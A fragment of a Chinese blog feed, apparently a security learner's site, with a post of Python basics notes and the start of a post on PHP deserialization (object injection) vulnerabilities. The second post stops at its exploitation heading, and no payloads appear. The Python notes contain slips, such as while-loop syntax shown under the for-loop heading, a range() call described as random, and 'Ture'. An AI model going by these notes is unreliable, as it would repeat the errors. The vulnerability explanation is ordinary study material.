href="https://www.freebuf.com/articles/web/126347.html">JSONP注入解析</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python(二)</title>
    <link href="/2021/02/18/python2/"/>
    <url>/2021/02/18/python2/</url>
    
    <content type="html"><![CDATA[<p>之前在sqli-labs的SQL盲注说有时间要学习一下编写python脚本来跑盲注关卡，但是python基础语法还没学完，今天来填坑👻👻👻</p><h2 id="列表"><a class="header-anchor" href="#列表">🍭</a>列表</h2><ul><li><p>列表可以索引，切片，加，乘，检查成员</p></li><li><p>列表可以作为一个方括号内的逗号分隔值出现</p></li><li><p>列表的数据项不需要具有相同的类型</p></li><li><p>创建一个列表，只要把逗号分隔的不同的数据项使用方括号括起来即可</p><pre><code class="hljs ini"><span class="hljs-attr">list</span> = [<span class="hljs-string">&#x27;genius&#x27;</span>, <span class="hljs-string">&#x27;rose&#x27;</span>, <span class="hljs-number">233</span>, <span class="hljs-number">8080</span>]</code></pre></li></ul><h4 id="访问值"><a class="header-anchor" href="#访问值">🍭</a>访问值</h4><ul><li><p>列表索引也是从 0 开始，第二个索引是 1</p></li><li><p>也可以从尾部开始，最后一个元素的索引为 -1，往前一位为 -2</p></li><li><p>也可以使用方括号 [] 的形式截取字符</p><pre><code class="hljs angelscript">nums = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>, <span class="hljs-number">40</span>, <span class="hljs-number">50</span>, <span class="hljs-number">60</span>, <span class="hljs-number">70</span>, <span class="hljs-number">80</span>, <span class="hljs-number">90</span>]print(nums[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<span class="hljs-comment">//输出结果:10, 20, 30, 40(nums[0:4]中的4索引位不包括)</span></code></pre></li></ul><p>访问规则与字符串类似，不再赘述</p><h4 id="更新"><a class="header-anchor" href="#更新">🍭</a>更新</h4><pre><code class="hljs angelscript">list[<span class="hljs-number">2</span>] = <span class="hljs-number">2001</span><span class="hljs-comment">//直接更新</span></code></pre><p>也可以使用 append() 方法来添加列表项</p><h4 id="删除"><a class="header-anchor" href="#删除">🍭</a>删除</h4><pre><code class="hljs angelscript">del list[<span class="hljs-number">2</span>]<span class="hljs-comment">//删除第三个元素</span></code></pre><h4 id="脚本操作符"><a class="header-anchor" href="#脚本操作符">🍭</a>脚本操作符</h4><p>+ 号用于组合列表，* 号用于重复列表（与字符串类似)</p><table><thead><tr><th>表达式</th><th>作用</th></tr></thead><tbody><tr><td>len([1, 2, 3])</td><td>求长度</td></tr><tr><td>[1, 2, 3] + [4, 5, 6]</td><td>组合</td></tr><tr><td>[‘Hi!’] * 4</td><td>重复</td></tr><tr><td>3 in [1, 2, 3]</td><td>判断元素是否存在于列表中</td></tr><tr><td>for x in [1, 2, 3]: print(x, end=&quot; &quot;)</td><td>迭代</td></tr></tbody></table><p>列表的嵌套，截取与拼接之前提到不再赘述</p><table><thead><tr><th>函数/方法</th><th>作用</th></tr></thead><tbody><tr><td>list(seq)</td><td>将元组转换为列表</td></tr><tr><td>list.append(obj)</td><td>在列表末尾添加新的对象</td></tr><tr><td>list.count(obj)</td><td>统计某个元素在列表中出现的次数</td></tr><tr><td>list.extend(seq)</td><td>在列表末尾一次性追加另一个序列中的多个值（用新列表扩展原来的列表）</td></tr><tr><td>list.index(obj)</td><td>从列表中找出某个值第一个匹配项的索引位置</td></tr><tr><td>list.insert(index, obj)</td><td>将对象插入列表</td></tr><tr><td>list.pop([index=-1])</td><td>移除列表中的一个元素（默认最后一个元素），并且返回该元素的值</td></tr><tr><td>list.remove(obj)</td><td>移除列表中某个值的第一个匹配项</td></tr><tr><td>list.reverse()</td><td>反向列表中元素</td></tr><tr><td>list.sort( key=None, reverse=False)</td><td>对原列表进行排序</td></tr><tr><td>list.clear()</td><td>清空列表</td></tr><tr><td>list.copy()</td><td>复制列表</td></tr><tr><td>list.sort()</td><td>升序排序</td></tr><tr><td>list.sort(reverse=Ture)</td><td>降序排序</td></tr></tbody></table><h4 id="将列表当做堆栈使用"><a class="header-anchor" href="#将列表当做堆栈使用">🍭</a>将列表当做堆栈使用</h4><p>列表方法使得列表可以很方便的作为一个堆栈来使用，堆栈作为特定的数据结构，最先进入的元素最后一个被释放（后进先出）。用 append() 方法可以把一个元素添加到堆栈顶。用不指定索引的 pop() 方法可以把一个元素从堆栈顶释放出来。</p><img src="/2021/02/18/python2/5.jpg" alt="5" style="zoom:50%;"><h4 id="将列表当作队列使用"><a class="header-anchor" href="#将列表当作队列使用">🍭</a>将列表当作队列使用</h4><p>在队列里第一加入的元素，第一个取出来；但效率不高。在列表的最后添加或者弹出元素速度快，在列表里插入或者从头部弹出速度却不快（因为所有其他的元素都得一个一个地移动）</p><h4 id="列表推导式"><a class="header-anchor" href="#列表推导式">🍭</a>列表推导式</h4><p>列表推导式提供了从序列创建列表的简单途径。通常应用程序将一些操作应用于某个序列的每个元素，用其获得的结果作为生成新列表的元素，或者根据确定的判定条件创建子序列。</p><img src="/2021/02/18/python2/6.jpg" alt="6" style="zoom:80%;"><p>元组之前介绍过了，这里补充：</p><ul><li>元组中只包含一个元素时，需要在元素后面添加逗号，否则括号会被当作运算符使用</li><li>元组的不可变指的是元组所指向的内存中的内容不可变</li></ul><p>字典补充：</p><p>键必须不可变，可以用数字，字符串或元组充当，而用列表就不行。</p><p>集合补充：</p> <pre><code class="hljs gradle">basket = &#123;<span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>, <span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>&#125;<span class="hljs-keyword">print</span>(basket)<span class="hljs-comment">//去重功能</span>&#123;<span class="hljs-string">&#x27;orange&#x27;</span>, <span class="hljs-string">&#x27;banana&#x27;</span>, <span class="hljs-string">&#x27;pear&#x27;</span>, <span class="hljs-string">&#x27;apple&#x27;</span>&#125;<span class="hljs-string">&#x27;orange&#x27;</span> in basket <span class="hljs-comment">//快速判断元素是否在集合内</span><span class="hljs-keyword">True</span><span class="hljs-string">&#x27;crabgrass&#x27;</span> in basket<span class="hljs-keyword">False</span></code></pre><p>随机删除集合中的一个元素(对集合进行无序的排列，然后将这个无序排列集合的左面第一个元素进行删除)</p>  <pre><code class="hljs css"><span class="hljs-selector-tag">s</span><span class="hljs-selector-class">.pop</span>()</code></pre><h4 id="end-关键字"><a class="header-anchor" href="#end-关键字">🍭</a>end 关键字</h4><p>将结果输出到同一行，或者在输出的末尾添加不同的字符</p><h2 id="语句"><a class="header-anchor" href="#语句">🍭</a>语句</h2><h4 id="if-语句"><a class="header-anchor" href="#if-语句">🍭</a>if 语句</h4><pre><code class="hljs gcode"><span class="hljs-keyword">if</span> co<span class="hljs-symbol">ndition_1</span>:    stateme<span class="hljs-symbol">nt_block_1</span>elif co<span class="hljs-symbol">ndition_2</span>:    stateme<span class="hljs-symbol">nt_block_2</span>else:    stateme<span class="hljs-symbol">nt_block_3</span></code></pre><p><strong>注意：</strong></p><ul><li>每个条件后面要使用冒号</li><li>使用缩进来划分语句块，相同缩进数的语句在一起组成一个语句块。</li><li>在Python中没有switch – case语句</li></ul><h4 id="for循环"><a class="header-anchor" href="#for循环">🍭</a>for循环</h4><pre><code class="hljs gauss"><span class="hljs-keyword">while</span> condition：   <span class="hljs-built_in">statements</span>……</code></pre><ul><li>注意冒号和缩进</li><li>在 Python 中没有 do…while 循环</li></ul><h4 id="while循环"><a class="header-anchor" href="#while循环">🍭</a>while循环</h4><pre><code class="hljs dts">while <span class="hljs-params">&lt;expr&gt;</span>:    <span class="hljs-params">&lt;statement(s)&gt;</span><span class="hljs-symbol">else:</span>    <span class="hljs-params">&lt;additional_statement(s)&gt;</span></code></pre><h4 id="for语句"><a class="header-anchor" href="#for语句">🍭</a>for语句</h4><pre><code class="hljs dts">for <span class="hljs-params">&lt;variable&gt;</span> in <span class="hljs-params">&lt;sequence&gt;</span>:    <span class="hljs-params">&lt;statements&gt;</span><span class="hljs-symbol">else:</span>    <span class="hljs-params">&lt;statements&gt;</span></code></pre><p><strong>range()函数</strong></p><p>遍历数字序列,生成数列</p><pre><code class="hljs apache"><span class="hljs-attribute">for</span> i in range(<span class="hljs-number">5</span>,<span class="hljs-number">9</span>)//在(<span class="hljs-number">5</span>,<span class="hljs-number">9</span>)之间随机<span class="hljs-attribute">for</span> i in range(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>, <span class="hljs-number">3</span>)//（<span class="hljs-number">0</span>，<span class="hljs-number">10</span>）之间以<span class="hljs-number">3</span>为步长<span class="hljs-attribute">list</span>(range(<span class="hljs-number">5</span>))//用range()创建一个列表</code></pre><h4 id="pass"><a class="header-anchor" href="#pass">🍭</a>pass</h4><p>空语句，保持程序结构的完整性。，pass 一般用做占位语句。</p><h2 id="函数"><a class="header-anchor" href="#函数">🍭</a>函数</h2><h4 id="自定义"><a class="header-anchor" href="#自定义">🍭</a>自定义</h4><ul><li>函数代码块以 <strong>def</strong> 开头，后接函数标识符名称和圆括号 <strong>()</strong>。</li><li>任何传入参数和自变量必须放在圆括号中间，圆括号之间可以用于定义参数。</li><li>函数的第一行语句可以选择性地使用文档字符串—用于存放函数说明</li><li>函数内容以冒号 : 起始，并且缩进。</li><li><strong>return [表达式]</strong> 结束函数，选择性地返回一个值给调用方，不带表达式的 return 相当于返回 None。</li></ul><pre><code class="hljs flix"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">函数名（参数列表）</span></span>:    函数体</code></pre><h4 id="参数"><a class="header-anchor" href="#参数">🍭</a>参数</h4><ul><li><p>必需参数</p><p>以正确的顺序传入函数。调用时的数量必须和声明时的一样。</p></li><li><p>关键字参数</p><p>函数调用使用关键字参数来确定传入的参数值。使用关键字参数允许函数调用时参数的顺序与声明时不一致。</p></li><li><p>默认参数</p></li><li><p>不定长参数</p><p>处理比当初声明时更多的参数，声明时不命名</p><p>加了星号 *的参数会以元组(tuple)的形式导入，存放所有未命名的变量参数。</p><p>带两个星号 *的参数会以字典的形式导入。</p></li></ul><h4 id="匿名函数"><a class="header-anchor" href="#匿名函数">🍭</a>匿名函数</h4><ul><li>python 使用 lambda 来创建匿名函数</li><li>lambda 函数拥有自己的命名空间，且不能访问自己参数列表之外或全局命名空间里的参数</li><li>lambda的主体是一个表达式仅能在lambda表达式中封装有限的逻辑进去。</li></ul><pre><code class="hljs css"><span class="hljs-selector-tag">lambda</span> <span class="hljs-selector-attr">[arg1 [,arg2,.....argn]</span>]<span class="hljs-selector-pseudo">:expression</span></code></pre><h2 id="输入与输出"><a class="header-anchor" href="#输入与输出">🍭</a>输入与输出</h2><blockquote><p>表达式语句</p><p>print() 函数</p><p>文件对象的 write() 方法：</p><blockquote><p>标准输出： <code>sys.stdout()</code></p><p>格式化输出：<code>str.format() </code></p><p>字符串输出：</p><blockquote><p><strong>str()：</strong> 函数返回一个用户易读的表达形式</p><p><strong>repr()：</strong> 产生一个解释器易读的表达形式</p><p><strong>rjust()</strong> : 将字符串靠右, 并在左边填充空格</p><p><strong>zfill()</strong>: 在数字的左边填充 0</p></blockquote></blockquote></blockquote><h2 id="读写文件"><a class="header-anchor" href="#读写文件">🍭</a>读写文件</h2><p>open() 将会返回一个 file 对象:</p><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">open</span><span class="hljs-params">(filename, mode)</span></span></code></pre><p>mode决定了打开文件的模式：只读，写入，追加</p><table><thead><tr><th>模式</th><th>描述</th></tr></thead><tbody><tr><td>r</td><td>以只读方式打开文件。文件的指针将会放在文件的开头。这是默认模式。</td></tr><tr><td>rb</td><td>以二进制格式打开一个文件用于只读。文件指针将会放在文件的开头。</td></tr><tr><td>r+</td><td>打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr><tr><td>rb+</td><td>以二进制格式打开一个文件用于读写。文件指针将会放在文件的开头。</td></tr></tbody></table><p>以上模式类推r,w,a.</p><h2 id="文件对象方法"><a class="header-anchor" href="#文件对象方法">🍭</a>文件对象方法</h2><ul><li><p><code>f.read()</code>:读取一个文件的内容</p></li><li><p><code>f.readline()</code>:从文件中读取单独的一行</p></li><li><p><code>f.readlines() </code>:将返回该文件中包含的所有行</p></li><li><p><code>f.write(string)</code> :将 string 写入到文件中, 然后返回写入的字符数</p></li><li><p><code>f.tell() </code>:返回文件对象当前所处的位置(从文件开头开始算起的字节数)</p></li><li><p><code>file.close()</code>:关闭文件。关闭后文件不能再进行读写操作</p></li><li><p><code>file.flush()</code>：刷新文件内部缓冲，直接把内部缓冲区的数据立刻写入文件</p></li><li><p><code>f.seek(offset, from_what)</code>:改变文件当前的位置</p><p><code>from_what </code>:0 表示开头, 1 表示当前位置, 2 表示文件的结尾</p></li></ul><h2 id="pickle-模块"><a class="header-anchor" href="#pickle-模块">🍭</a>pickle 模块</h2><pre><code class="hljs css"><span class="hljs-selector-tag">pickle</span><span class="hljs-selector-class">.dump</span>(<span class="hljs-selector-tag">obj</span>, <span class="hljs-selector-tag">file</span>, <span class="hljs-selector-attr">[,protocol]</span>)</code></pre><ul><li>序列化操作:将程序中运行的对象信息保存到文件中去，永久存储。</li><li>反序列化操作:从文件中创建上一次程序保存的对象。</li></ul><p>OS模块详见：<a href="https://www.runoob.com/python3/python3-os-file-methods.html">OS 文件/目录方法</a></p><h2 id="报错信息"><a class="header-anchor" href="#报错信息">🍭</a>报错信息</h2><blockquote><p>语法错误</p><blockquote><p>Python 无法解析代码</p></blockquote></blockquote><blockquote><p>异常</p><blockquote><p>运行期检测到的错误</p><blockquote><p><strong>Try 语句:</strong></p><p>可使用 try 语句处理异常</p><ul><li><p><code>try</code>：必需子句,是 Python 在 <code>try</code> 语句中首先运行的代码。</p></li><li><p><code>except</code>：</p></li></ul><p><em>一个 try 语句可能包含多个except子句,但最多只有一个分支会被执行</em></p><p><em>运行 <code>try</code> 块时遇到异常，它将跳到处理该异常的 <code>except</code> 块。</em></p><p><em>如果一个异常没有与任何的 except  匹配，那么这个异常将会传递给上层的 try 中</em></p><p><em>一个except子句可以同时处理多个异常（）:</em></p><pre><code class="hljs python"><span class="hljs-keyword">except</span> (RuntimeError, TypeError, NameError):    <span class="hljs-keyword">pass</span></code></pre><ul><li><p><code>else</code>：在运行 <code>try</code> 块时没有遇到异常执行</p></li><li><p><code>finally</code>：无论是否发生异常都将执行最后的代码</p></li></ul></blockquote></blockquote></blockquote><h4 id="抛出异常"><a class="header-anchor" href="#抛出异常">🍭</a>抛出异常</h4><p>使用 raise 语句抛出一个指定的异常：</p><pre><code class="hljs inform7">raise <span class="hljs-comment">[Exception <span class="hljs-comment">[, args <span class="hljs-comment">[, traceback]</span>]</span>]</span></code></pre><p>raise的参数指定了要被抛出的异常：一个异常的实例或者是异常的类（也就是 Exception 的子类）</p><h2 id="面向对象"><a class="header-anchor" href="#面向对象">🍭</a>面向对象</h2><ul><li><code>类(Class)</code>: 描述具有相同的属性和方法的对象的集合。它定义了该集合中每个对象所共有的属性和方法。对象是类的实例。</li><li><code>方法</code>:类中定义的函数。（与普通的函数的区别:必须有一个额外的第一个参数名称:self）</li><li><code>类变量</code>:类变量在整个实例化的对象中是公用的。类变量定义在类中且在函数体之外。类变量通常不作为实例变量使用。</li><li><code>数据成员</code>:类变量或者实例变量用于处理类及其实例对象的相关的数据。</li><li><code>方法重写</code>:如果从父类继承的方法不能满足子类的需求，可以对其进行改写，这个过程叫方法的覆盖,也称为方法的重写。</li><li><code>局部变量</code>:定义在方法中的变量，只作用于当前实例的类。</li><li><code>实例变量</code>:在类的声明中，属性是用变量来表示的，这种变量就称为实例变量，实例变量就是一个用 self 修饰的变量。</li><li><code>继承</code>:即一个派生类（derived class）继承基类（base  class）的字段和方法。继承也允许把一个派生类的对象作为一个基类对象对待。</li><li><code>实例化</code>:创建一个类的实例，类的具体对象。</li><li><code>对象</code>:通过类定义的数据结构实例。对象包括两个数据成员（类变量和实例变量）和方法。</li></ul><blockquote><p>类的私有属性</p><blockquote><p><strong>__private_attrs</strong>：两个下划线开头，声明该属性为私有，不能在类的外部被使用或直接访问。在类内部的方法中使用时 <strong>self.__private_attrs</strong></p></blockquote></blockquote><blockquote><p>类的私有方法</p><blockquote><p><strong>__private_method</strong>：两个下划线开头，声明该方法为私有方法，只能在类的内部调用 ，不能在类的外部调用。<strong>self.__private_methods</strong></p></blockquote></blockquote><p>类的专有方法</p><blockquote><p><code>__init__ </code>:构造函数，在生成对象时调用<br><strong><code>__del__</code>:</strong> 析构函数，释放对象时使用<br><strong><code>__repr__</code> :</strong> 打印，转换<br><strong><code>__setitem__</code> :</strong> 按照索引赋值<br><strong><code>__getitem__</code>:</strong> 按照索引获取值<br><strong><code>__len__</code>:</strong> 获得长度<br><strong><code>__cmp__</code>:</strong> 比较运算<br><strong><code>__call__</code>:</strong> 函数调用<br><strong><code>__add__</code>:</strong> 加运算<br><strong><code>__sub__</code>:</strong> 减运算<br><strong><code>__mul__</code>:</strong> 乘运算<br><strong><code>__truediv__</code>:</strong> 除运算<br><strong><code>__mod__</code>:</strong> 求余运算<br><strong><code>__pow__</code>:</strong> 乘方</p></blockquote><h2 id="命名空间"><a class="header-anchor" href="#命名空间">🍭</a>命名空间</h2><p>各个命名空间独立：</p><ul><li><strong>内置名称（built-in names</strong>），内置的名称，如函数名 abs、char 和异常名称 BaseException、Exception ……</li><li><strong>全局名称（global names）</strong>，模块中定义的名称，记录了模块的变量，包括函数、类、其它导入的模块、模块级的变量和常量。</li><li><strong>局部名称（local names）</strong>，函数中定义的名称，记录了函数的变量，包括函数的参数和局部定义的变量</li></ul><img src="/2021/02/18/python2/3.png" alt="3" style="zoom:67%;"><h2 id="作用域"><a class="header-anchor" href="#作用域">🍭</a>作用域</h2><p>程序可以直接访问命名空间的正文区域</p><img src="/2021/02/18/python2/4.png" alt="4" style="zoom:67%;"><p>做图上瘾ing🐷🐷🐷</p><h2 id="迭代器"><a class="header-anchor" href="#迭代器">🍭</a>迭代器</h2><ul><li>访问集合元素的一种方式。</li><li>它可以记住遍历的位置的对象。</li><li>迭代器对象从集合的第一个元素开始访问，直到所有的元素被访问完结束。迭代器只能往前不会后退。</li></ul><p>基本的方法：</p><blockquote><p><strong><code>__iter()__</code></strong></p><blockquote><p>返回一个特殊的迭代器对象， 这个迭代器对象实现了<code>__next__()</code>方法并通过 StopIteration 异常标识迭代的完成</p></blockquote></blockquote><blockquote><p><strong><code>__next()__</code></strong></p><blockquote><p>返回下一个迭代器对象</p></blockquote></blockquote><h2 id="生成器"><a class="header-anchor" href="#生成器">🍭</a>生成器</h2><p>使用了 yield 的函数。</p><ul><li>生成器是一个返回迭代器的函数，只能用于迭代操作</li><li>调用生成器时，遇到 yield 时函数会暂停并保存当前所有的运行信息，返回 yield 的值, 并在下一次执行 next() 方法时从当前位置继续运行。</li></ul><h2 id="模块"><a class="header-anchor" href="#模块">🍭</a>模块</h2><p>把这些定义存放在文件中，为一些脚本或者交互式的解释器实例使用，这个文件被称为模块，模块包含所有定义的函数和变量的文件，且可以被别的程序引入。</p><h4 id="常用模块"><a class="header-anchor" href="#常用模块">🍭</a>常用模块</h4><ul><li>csv：读取 csv 文件</li><li>collections：常见数据类型的实用扩展，包括 OrderedDict、defaultdict 和 namedtuple</li><li>random：生成假随机数字，随机打乱序列并选择随机项</li><li>string：关于字符串的更多函数。此模块还包括实用的字母集合，例如 string.digits（包含所有字符都是有效数字的字符串）。</li><li>re：通过正则表达式在字符串中进行模式匹配</li><li>math：一些标准数学函数</li><li>os：与操作系统交互</li><li>os.path：os 的子模块，用于操纵路径名称</li><li>sys：直接使用 Python 解释器</li><li>json：适用于读写 json 文件（面向网络开发）</li></ul><h4 id="import-语句"><a class="header-anchor" href="#import-语句">🍭</a>import 语句</h4><pre><code class="hljs ceylon"><span class="hljs-keyword">import</span> <span class="hljs-keyword">module</span><span class="hljs-number">1</span>[, <span class="hljs-keyword">module</span><span class="hljs-number">2</span>[,... moduleN]<span class="hljs-keyword">import</span> A as B<span class="hljs-comment">//给引入的包A定义一个别名B</span></code></pre><p>举个栗子💌💌💌：</p><pre><code class="hljs stylus">import sys<span class="hljs-comment">// 引入标准库中的 sys.py 模块</span><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> sys<span class="hljs-selector-class">.argv</span>:<span class="hljs-comment">//sys.argv 是一个包含命令行参数的列表</span>   print(i) <span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;\nPython 路径为：&#x27;</span>, sys.path, <span class="hljs-string">&#x27;\n&#x27;</span>)</span></span><span class="hljs-comment">//查找所需模块的路径的列表</span></code></pre><ul><li>一个模块只会被导入一次</li><li>搜索路径是由一系列目录名组成的，Python解释器就依次从这些目录中去寻找所引入的模块</li></ul><h4 id="from-…-import-语句"><a class="header-anchor" href="#from-…-import-语句">🍭</a>from … import 语句</h4><p>从模块中导入一个指定的部分到当前命名空间中：</p><pre><code class="hljs angelscript"><span class="hljs-keyword">from</span> modname <span class="hljs-keyword">import</span> name1[, name2[, ... nameN]]eg: <span class="hljs-keyword">from</span> fibo <span class="hljs-keyword">import</span> fib, fib2<span class="hljs-comment">//不会把整个fibo模块导入到当前的命名空间中，它只会将fibo里的fib函数引入进来</span><span class="hljs-keyword">from</span> modname <span class="hljs-keyword">import</span> *<span class="hljs-comment">//把一个模块的所有内容全都导入到当前的命名空间</span></code></pre><h4 id="name-属性"><a class="header-anchor" href="#name-属性">🍭</a>__name__属性</h4><ul><li>一个模块被另一个程序第一次引入时，其主程序将运行。如果我们想在模块被引入时，模块中的某一程序块不执行，我们可以用__name__属性来使该程序块仅在该模块自身运行时执行</li><li>每个模块都有一个__name__属性，当其值是’<strong>main</strong>’时，表明该模块自身在运行，否则是被引入。</li></ul><h4 id="dir-函数"><a class="header-anchor" href="#dir-函数">🍭</a>dir() 函数</h4><p>内置的函数 dir() 可以找到模块内定义的所有名称。以一个字符串列表的形式返回.</p><h4 id="sys模块"><a class="header-anchor" href="#sys模块">🍭</a>sys模块</h4><p>内置于每一个 Python 解析器中，变量 sys.ps1 和 sys.ps2 定义了主提示符和副提示符所对应的字符串:</p><pre><code class="hljs ruby"><span class="hljs-meta">&gt;&gt;</span>&gt; import sys<span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps1<span class="hljs-string">&#x27;&gt;&gt;&gt; &#x27;</span><span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps2<span class="hljs-string">&#x27;... &#x27;</span><span class="hljs-meta">&gt;&gt;</span>&gt; sys.ps1 = <span class="hljs-string">&#x27;C&gt; </span><span class="hljs-string">C&gt; </span></code></pre><h4 id="包"><a class="header-anchor" href="#包">🍭</a>包</h4><p>一种管理 Python 模块命名空间的形式，采用&quot;点模块名称&quot;。若一个模块的名称是 A.B， 那么他表示一个包 A中的子模块 B 。可避免不同模块之间的全局变量相互影响或不同库之间的模块重名。</p><p>导入包时，Python 会根据 sys.path 中的目录来寻找这个包中包含的子目录。</p><p>目录只有包含一个叫做 <strong>init</strong>.py 的文件才会被认作是一个包</p><p><strong>导入方法</strong></p><ul><li>只导入一个包里面的特定模块</li><li>导入子模块</li><li>直接导入一个函数或者变量</li></ul><p><strong>注</strong>：</p><p><em><code>from package import item</code>以这种形式导入时，对应的 item 既可以是包里面的子模块（子包），或者包里面定义的其他名称，比如函数，类或者变量。（先把 item 当作一个包定义的名称，如果没找到，再试图按照一个模块去导入。如果还没找到，就 <strong>:exc:ImportError</strong> 异常）</em></p><p><em><code>import item.subitem.subsubitem</code> 这种导入形式，除了最后一项，都必须是包，而最后一项则可以是模块或者是包，但是不可以是类，函数或者变量的名字。</em></p><p><em><code>from sound.effects import </code>:若定义文件 <strong><strong>init</strong>.py</strong> 存在一个叫做 <strong><strong>all</strong></strong> 的列表变量，会把这个列表中的所有名字作为包内容导入（ Windows系统不区分大小写）；若 <strong><strong>all</strong></strong> 无定义，就不会导入包 里的任何子模块。而是把包和它里面定义的所有内容导入。</em></p><h4 id="常用第三方软件包"><a class="header-anchor" href="#常用第三方软件包">🍭</a>常用第三方软件包</h4><blockquote><p><code>IPython</code> - 更好的交互式 Python 解释器<br><code>requests</code> - 提供易于使用的方法来发出网络请求。适用于访问网络 API。<br><code>Flask</code> - 一个小型框架，用于构建网络应用和 API。<br><code>Django </code>- 一个功能更丰富的网络应用构建框架。Django 尤其适合设计复杂、内容丰富的网络应用。<br><code>Beautiful Soup</code> - 用于解析 HTML 并从中提取信息。适合网页数据抽取。<br><code>pytest</code> - 扩展了 Python 的内置断言，并且是最具单元性的模块。<br><code>PyYAML </code>- 用于读写 YAML 文件。<br><code>NumPy </code>- 用于使用 Python 进行科学计算的最基本软件包。它包含一个强大的 N 维数组对象和实用的线性代数功能等。<br><code>pandas </code>- 包含高性能、数据结构和数据分析工具的库。尤其是，pandas 提供 dataframe！<br><code>matplotlib</code> - 二维绘制库，会生成达到发布标准的高品质图片，并且采用各种硬拷贝格式和交互式环境。<br><code>ggplot </code>- 另一种二维绘制库，基于 R’s ggplot2 库。<br><code>Pillow - Python</code> 图片库可以向你的 Python 解释器添加图片处理功能。<br><code>pyglet </code>- 专门面向游戏开发的跨平台应用框架。<br><code>Pygame</code> - 用于编写游戏的一系列 Python 模块。<br><code>pytz - Python</code> 的世界时区定义。</p></blockquote><p>基础知识大概就这些💖💖💖</p><p><strong>脚本</strong></p><p>与一般程序的主要区别在于是否编译。相对于程序而言，脚本更加随性。脚本可以直接在某种具有解释功能的环境中运行。</p><p><strong>文本编辑器</strong></p><ul><li><a href="https://code.visualstudio.com/download">Visual Studio Code</a></li><li><a href="http://www.sublimetext.com/">Sublime Text</a></li><li><a href="https://notepad-plus-plus.org/">Notepad++</a></li><li><a href="https://atom.io/">Atom</a></li></ul><p>上面这四个都挺好用的，<code>VS code</code>我是用来查看源码，<code>notepad</code>和<code>sublime</code>用来编写代码，<code>atom</code>功能比较全是由GitHub构建的一个强大的交互式开发环境💯💯💯，Linux里还有<code>emacs</code>和<code>vim</code>可用.</p><p>结束☀️☀️☀️☀️</p><p>参考：<a href="https://www.runoob.com/python3">菜鸟教程</a></p><p><a href="https://blog.csdn.net/reallyr/article/details/87364399">python脚本编写</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>PHP反序列化漏洞</title>
    <link href="/2021/02/14/re/"/>
    <url>/2021/02/14/re/</url>
    
    <content type="html"><![CDATA[<h2 id="php面向对象编程："><a class="header-anchor" href="#php面向对象编程：">🍭</a>php面向对象编程：</h2><ul><li>对象：可以对其做事情的一些东西。一个对象有<strong>状态、行为和标识</strong>三种属性。</li><li>类：一个共享相同结构和行为的对象的集合。每个类的定义都以关键字class开头，后面跟着类的名字。一个类可以包含有属于自己的变量，变量（称为“属性”）以及函数（“称为方法”）类定义了一件事物的抽象特点。</li></ul><h2 id="序列化"><a class="header-anchor" href="#序列化">🍭</a>序列化</h2><p>将一个对象、数组、字符串等转化为字节流便于传输。序列化的目的是方便数据的传输和存储,但序列化不保存方法。</p><p><strong>serialize()</strong></p><p>把一个对象变成可以传输的字符串，该函数会先检查类中是否存在一个魔术方法 <code>__sleep()</code>,如果存在，<code>__sleep()</code>方法会先被调用，然后才执行序列化操作,可以在<code>__sleep()</code>方法里可以决定哪些属性被序列化。先写个代码测试一下</p><p><img src="/2021/02/14/re/1.png" alt="1"></p><p>运行结果：</p><img src="/2021/02/14/re/2.jpg" alt="2" style="zoom:67%;"><ul><li>O:代表object</li><li>1:代表对象名字长度为一个字符</li><li>S:对象的名称</li><li>1:代表对象里面有一个变量</li><li>s:数据类型</li><li>4:变量名称的长度</li><li>test:变量名称</li><li>s:数据类型</li><li>12:变量值的长度</li><li>Genius is me:变量值</li></ul><p>额外介绍一个知识😝😝😝</p><p><strong>属性</strong></p><ul><li><code>public</code></li><li><code>protected</code>,被序列化的时候属性值会变成%00*%00属性名</li><li><code>private</code>,被序列化的时候属性值会变成%00类名%00属性名</li></ul><h2 id="反序列化"><a class="header-anchor" href="#反序列化">🍭</a>反序列化</h2><p>将序列化之后的字节流还原成对象、字符、数组等.</p><p><strong>unserialize ()</strong></p><p>unserialize() 会检查是否存在一个<code> __wakeup()</code>魔术方法，如果存在则会先调用<code>__wakeup()</code>方法在进行反序列化可以再__wakeup()方法中对属性进行初始化或者改变。</p><h2 id="PHP反序列化漏洞"><a class="header-anchor" href="#PHP反序列化漏洞">🍭</a>PHP反序列化漏洞</h2><p>PHP反序列化漏洞又称PHP对象注入。在反序列化时，如果反序列化对象中存在魔法函数，使用unserialize()函数同时也会触发。一旦我们能够控制unserialize()入口，就可能引发对象注入漏洞。</p><p><strong>魔术方法：</strong></p><ul><li><p><code> __wakeup (void)</code></p></li><li><p><code>__sleep()</code></p></li><li><p><code> __construct ([ mixed $args [, $... ]])</code></p><p>具有构造函数的类会在每次创建新对象时先调用此方法。</p></li><li><p><code>__destruct ( void )</code></p><p>析构函数会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。</p></li><li><p><code>public string __toString ( void )</code></p><p><code>__toString( ) </code>方法用于一个类被当成字符串时应怎样回应。<strong>此方法必须返回一个字符串</strong></p></li></ul><p>测试一下</p><p><img src="/2021/02/14/re/3.png" alt="3"></p><p>测试结果</p><img src="/2021/02/14/re/4.jpg" alt="4" style="zoom:67%;"><p>由结果可以看出各函数的执行顺序。</p><h2 id="漏洞利用"><a class="header-anchor" href="#漏洞利用">🍭</a>漏洞利用</h2><h4 id="wakeup-直接利用"><a class="header-anchor" href="#wakeup-直接利用">🍭</a>__wakeup()直接利用</h4><p>当一些漏洞/危害代码在<code>__wakeup() 